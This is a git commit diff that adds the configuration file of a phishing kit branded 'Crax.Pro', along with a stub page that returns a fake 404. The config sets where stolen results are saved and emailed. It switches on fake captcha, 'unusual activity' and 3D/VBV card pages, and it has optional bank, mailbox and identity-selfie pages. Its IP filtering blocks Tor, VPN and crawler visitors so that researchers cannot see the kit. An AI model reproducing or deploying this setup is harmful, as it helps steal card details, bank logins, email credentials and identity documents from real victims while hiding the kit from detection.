fe2bcc5e4a46d899cdca508b0115ae720c0b0bb8
kwesimain <opokulive@gmail.com>
2025-01-31 03:15:03 +0000

    trr

---
+++ extra/mine.php
@@ -0,0 +1,52 @@
+<?php
+/*
+Now it's Crax.Pro time 
+$CraxP
+*/
+	// ================================= //
+	// ================================= //
+	$redirectlink = "localhost";	 	 // You must use redirect or the scam will not open
+	// ================================= //
+	// ================================= //
+	// This is your Scama Key if you post the scam will banned Don`t edit it =D
+	$API_KEY = "CRAX.PRO";
+	// This is your Scama Key if you post the scam will banned Don`t edit it =D
+	// ================================= //
+	// ================================= //
+	$scamname = "💸 Crax.Pro 💸";	    	
+	// ================================= //
+	// ================================= //
+	$saveintext = "yes";   // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
+	$filename = "craxrzlt"; // Change it to any name you want this will be the Rzlt file text
+	// ================================= //
+	// ================================= //
+	$sendtoemail = "yes";  // If you don`t want the scam Send the  Result to your email Edit |yes| to |no|
+	$yours = "crax.pro@email.net"; 	 // <-- Your Email Here 
+	// ================================= //
+	// ================================= //
+	$show_captcha ="yes"; 				 // If you don`t want to show ||Captcha Page|| edit |yes| to |no| 
+	$show_unusual_activity ="yes"; 		 // If you don`t want to show ||Unusual Activity|| edit |yes| to |no|
+	$show_3D_VBV ="yes"; 				 // If you don`t want to show ||3D/VBV Page|| edit |yes| to |no| 
+	$show_mailaccess ="no"; 			 // If you don`t want to show ||Mail Access Page|| edit |yes| to |no| 
+    $show_2ndmailaccess ="no"; 			 // If you don`t want to show 2nd ||Mail Access Page|| edit |yes| to |no|
+	$show_bank ="no"; 					 // If you don`t want to show ||Bank Page|| edit |yes| to |no| 
+	$show_identity ="no"; 				 // If you don`t want to show ||Identity/Selfiy|| edit |yes| to |no| 
+	// ================================= //
+	// ================================= //
+	// ********* IP Protection ********* //
+	$ip_protection = "no"; 			 // If you don`t want to use IP Protection change yes to no
+	$ip_protection_api = "r7mXQAG01mKYGj5cYEQc1COV7WMwAOTi"; // Dont touch :()
+	$max_fraud_score = "75";			// Put max fraud score 
+	$fuck_tor = "true";					// If you don`t want to disallow Tor Users change true to xAthena
+	$fuck_vpn = "true";					// If you don`t want to disallow VPN Users change true to xAthena
+	$fuck_crawler = "true";				// If you don`t want to disallow Crawler Users change true to xAthena
+	// ================================= //
+	// ================================= //
+	/////////////////DATE-function//////////////////////
+	function now() {
+		date_default_timezone_set('GMT');
+		return date("d/m/Y h:i:sa");
+	}
+	/////////////////DATE-function//////////////////////
+
+?>
---
+++ extra/stockers/index.php
@@ -0,0 +1,6 @@
+<?php
+/*
+Now it's Crax.Pro time 
+*/
+        exit(header('HTTP/1.0 404 Not Found'));
+?>
